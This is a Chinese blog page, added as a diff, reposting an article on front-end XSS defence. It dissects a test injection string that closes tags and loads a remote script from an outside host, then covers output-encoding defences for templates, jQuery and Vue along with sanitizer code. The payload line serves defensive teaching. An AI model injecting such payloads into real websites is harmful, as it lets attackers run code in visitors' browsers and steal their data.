@@ -1,0 +1,346 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>云淡风轻 || 前端安全之 xss 攻击</title>
+    <meta name="author" content="Ne-21">
+    <meta name="description" content="放弃不难，但坚持一定很酷。 ">
+    <meta name="keywords" content="云淡风轻, hexo, various, python, html, 小刀娱乐网, 编程, 自学 ">
+    <link rel="icon" href="/https://imgs.521daigua.cn/blog/tx.jpeg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">云淡风轻</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>首页</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="about" theme="filled" />
+            </span>
+            <span>关于</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="archives" theme="filled" />
+            </span>
+            <span>归档</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="categories" theme="filled" />
+            </span>
+            <span>分类</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>标签</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>云淡风轻</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">首页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="about" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="archives" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">归档</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="categories" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>前端安全之 xss 攻击 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2020/3/15
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/web" style=color:#879cff>
+                    web
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="什么是-xss？"><a href="#什么是-xss？" class="headerlink" title="什么是 xss？"></a>什么是 xss？</h1><p>XSS 攻击指通过巧妙的方法注入恶意指令代码到网页，使<strong>用户加载并执行</strong>攻击者恶意制造的代码。</p>
+<h1 id="危害有什么？"><a href="#危害有什么？" class="headerlink" title="危害有什么？"></a>危害有什么？</h1><p>1.跳转到广告页面，页面注入广告等等。<br>2.导致公司域名被其他平台拉黑，从而使业务受损。<br>3.用户的财产受到威胁，他注入的代码可以在网页中任意请求接口。</p>
+<a id="more"></a>
+<h1 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h1><pre><code>http://upcdn&quot;&#39;&gt;&lt;/script&gt;&lt;script src=&quot;//www.lilnong.top/xss.js&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(12306)&lt;/script&gt;&lt;svg&gt;&lt;/svg&gt;\n\t\n
+</code></pre>
+<p>上面的代码是我们测试的时候使用的，接下来我们来分析一下这个代码主要用途。<br>1.<code>http://upcdn</code> 这个字符串是用来伪装的。</p>
+<ul>
+<li><code>&lt;img src=&quot;$&#123;str&#125;&quot;&gt;</code> 动态拼接图片地址</li>
+<li><code>&lt;a href=&quot;$&#123;str&#125;&quot;&gt;</code> 动态跳转页面地址</li>
+</ul>
+<p>2.<code>&quot;&#39;&gt;</code> 这两个就是为了截断当前字符串，然后闭合标签。</p>
+<ul>
+<li><code>&lt;img src=&quot;$&#123;str&#125;&quot;&gt;</code></li>
+</ul>
+<p>3.<code>&lt;/script&gt;</code> 也是为了闭合标签，这个主要用在后台模板输出的时候。后台模板 velocity、freemarker 之类的。</p>
+<ul>
+<li><code>&lt;script&gt;var imgUrl = $&#123;str&#125;&lt;/script&gt;</code></li>
+</ul>
+<p>4.<code>&lt;script src=&quot;//www.lilnong.top/xss.js&quot;&gt;&lt;/script&gt;</code> 就是引入一个js，这种方式比较常见。注入之后，攻击者只需要修改自己的文件，就可以更新了。<br>5.<code>&lt;script&gt;alert(12306)&lt;/script&gt;</code> 直接执行js代码<br>6.<code>&lt;svg&gt;&lt;/svg&gt;</code> 注入一个元素，用于展示一个异常块打乱布局。比如 <code>vue</code> 中的 <code>v-html</code> 不会执行 <code>script</code> 标签中的内容，但是会显示 <code>svg</code> 图片。<br>7.<code>\n\t\n</code> 是为了测试后台模板输出的场景。</p>
+<h1 id="防护场景及方案"><a href="#防护场景及方案" class="headerlink" title="防护场景及方案"></a>防护场景及方案</h1><h2 id="后台模板"><a href="#后台模板" class="headerlink" title="后台模板"></a>后台模板</h2><p>1.<code>toHtml</code> 主要用于输出在页面（标签中）中，将用户输入的内容进行编码比如 <code>&lt;</code>转换为<code>&amp;lt;</code>。</p>
+<ul>
+<li><span>${nickanme}</span></li>
+</ul>
+<p>2.<code>toJS</code> 主要用于输出在script标签中，这里需要防止打断js，比如处理成<code>&quot;&#39;\</code>n为<code>\&quot;\&#39;\\n</code><br>3.<code>toUrl</code> 这里其实和 <code>toHtml</code> 场景很像，但是需要判断url基础格式。</p>
+<ul>
+<li><code>https://</code></li>
+<li><code>//lilnong.top</code></li>
+<li><code>/static</code></li>
+<li><code>./static</code></li>
+<li><code>../static</code></li>
+</ul>
+<h2 id="jquery-amp-原生js"><a href="#jquery-amp-原生js" class="headerlink" title="jquery&amp;原生js"></a>jquery&amp;原生js</h2><p>1.toHtml 场景。jquery中基本上都是拼接一下，然后 <code>.html</code> 输出一下。这里需要做的也是把用户输入的做一下实体编码转换。<br>2.toUrl 场景。校验一下url，然后 <code>toHtml</code> 或者 <code>encode</code> 都可以。</p>
+<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><p>1.toHtml 场景。<code>v-html</code> 这里需要注意一下，尽可能不要使用，因为会导致注入问题。也可以toHtml一下，但是没必要不是吗。<br>2.toUrl 场景。<code>:href </code>主要 <code>javascript:alert(1);</code>这种场景，做url校验就可以。<br>3.toHtml 场景。使用原生的方法，vue 中非要 <code>innerHTML</code>的那些人。</p>
+<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="富文本场景"><a href="#富文本场景" class="headerlink" title="富文本场景"></a>富文本场景</h2><p>1.做文章那种，大量的标签，属性。这种一般需要后端处理。<code>HTML Purifier</code><br>2.文字加表情，后者搜索高亮的场景。这种我们可以先执行<code>toHtml</code>，然后再匹配替换，最后在输出到页面即可。</p>
+<h2 id="换行符问题"><a href="#换行符问题" class="headerlink" title="换行符问题"></a>换行符问题</h2><p>有时我们在<code>textarea</code>中输入<code>\n</code>，渲染的时候空白符就被浏览器给吃了。针对这种情况，我们可以用下面的方案处理</p>
+<p>1.通过 css 属性 <code>white-space</code>，或者 <code>&lt;pre&gt;</code> 标签<br>2.一般人们是正则替换<code>.replace(/\n/g,&#39;&lt;br&gt;)</code>，这种输出的时候万一里面有代码不就凉了吗。所以我们先 toHtml 然后在使用，这样可以防止注入问题。<br>3.其实 <code>.innerText</code> 可以自动把<code>\n</code>转换为<code>&lt;br&gt;</code>，你可以自己试试</p>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><pre><code>window.base = &#123;
+    toHtml: function (val) &#123;
+        if( typeof val != &#39;string&#39; ) return &#39;&#39;;
+        var entityMap = &#123;
+            &quot;&amp;&quot;: &quot;&amp;amp;&quot;,
+            &quot;&lt;&quot;: &quot;&amp;lt;&quot;,
+            &quot;&gt;&quot;: &quot;&amp;gt;&quot;,
+            &#39;&quot;&#39;: &#39;&amp;quot;&#39;,
+            &quot;&#39;&quot;: &#39;&amp;#39;&#39;,
+            &quot;/&quot;: &#39;&amp;#x2F;&#39;
+        &#125;;
+        return String(val).replace(/[&amp;&lt;&gt;&quot;&#39;\/]/g, function (s) &#123;
+            return entityMap[s];
+        &#125;);
+    &#125;,
+    toUrl: function (url) &#123;
+        if( typeof url != &#39;string&#39; ) return &#39;#&#39;;
+        if(url.match(/^http/i))&#123;
+            return encodeURI(url)
+        &#125;
+        return &#39;#&#39;
+    &#125;,
+&#125;;
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000022014580">https://segmentfault.com/a/1190000022014580</a></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2019 - 2021 云淡风轻
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @Ne-21
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+        <div>
+            备案号：<a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">
+                <a target="_blank" href="https://www.beian.miit.gov.cn" rel="nofollow noopener">冀ICP备19031443号</a><br><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="https://imgs.521daigua.cn/%E6%A0%B7%E5%BC%8F%E5%9B%BE.7cf927c.png" width="300px" height="20px"></a><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?46c8202ccbfe91fef8f7d5fddc0ce94a";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script>
+            </a>
+        </div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
